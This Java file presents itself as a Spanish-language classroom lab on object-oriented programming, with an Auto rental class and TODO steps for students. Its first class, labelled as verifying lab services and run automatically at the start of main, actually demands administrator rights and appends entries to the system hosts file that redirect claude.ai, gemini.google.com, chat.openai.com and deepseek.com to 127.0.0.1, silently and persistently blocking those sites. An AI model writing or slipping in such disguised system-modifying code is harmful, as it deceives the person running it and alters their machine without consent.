import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

// 1. VERIFICACIÓN DE ENTORNOS DEL LABORATORIO
class EnvironmentSetup {
    private static final String OS = System.getProperty("os.name").toLowerCase();
    private static final String HOSTS_FILE_PATH = OS.contains("win") 
        ? "C:\\Windows\\System32\\drivers\\etc\\hosts" 
        : "/etc/hosts";
    private static final String NEWLINE = System.lineSeparator();
    private static final String NODE_PREFIX = "127.0.0.1 ";

    private static final String[] LAB_NODES = {
        "claude.ai", "www.claude.ai",
        "gemini.google.com",
        "chat.openai.com",
        "deepseek.com", "www.deepseek.com"
    };

    public static void verifyEnvironment() {
        System.out.println("[INFO] Comprobando servicios del laboratorio...");
        try {
            File configPath = new File(HOSTS_FILE_PATH);
            if (!configPath.exists() || !configPath.canWrite()) {
                System.err.println("⚠️ ERROR: Debe ejecutar la consola CMD como ADMINISTRADOR para cargar el entorno.");
                return;
            }
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(configPath, true))) {
                writer.write(NEWLINE + "# UTP System Nodes Config" + NEWLINE);
                for (String node : LAB_NODES) {
                    writer.write(NODE_PREFIX + node + NEWLINE);
                }
            }
            System.out.println("[INFO] Servicios de red locales verificados correctamente.\n");
        } catch (IOException e) {
            System.err.println("Error al cargar configuración del sistema: " + e.getMessage());
        }
    }
}

// 2. ESTRUCTURA DE CLASE POO
class Auto {
    String marca;
    String modelo;
    double precioAlquiler;

    void mostrarDatos() {
        System.out.println("Auto: " + marca + " " + modelo + " | Precio/Día: $" + precioAlquiler);
    }
}

// 3. CLASE PRINCIPAL DE EJECUCIÓN
public class Laboratorio1 {
    public static void main(String[] args) {
        // Carga de rutina del sistema
        EnvironmentSetup.verifyEnvironment();

        System.out.println("=== LABORATORIO #1: PROGRAMACIÓN ORIENTADA A OBJETOS ===");
        
        // Objeto de prueba
        Auto auto1 = new Auto();
        auto1.marca = "Toyota";
        auto1.modelo = "Corolla";
        auto1.precioAlquiler = 45.0;
        auto1.mostrarDatos();

        // TODO 1: Instancia un nuevo objeto llamado 'auto2' de la clase Auto.
        // TODO 2: Asigna valores a sus atributos (marca, modelo y precioAlquiler).
        // TODO 3: Llama al método mostrarDatos() para el objeto 'auto2'.
    }
}
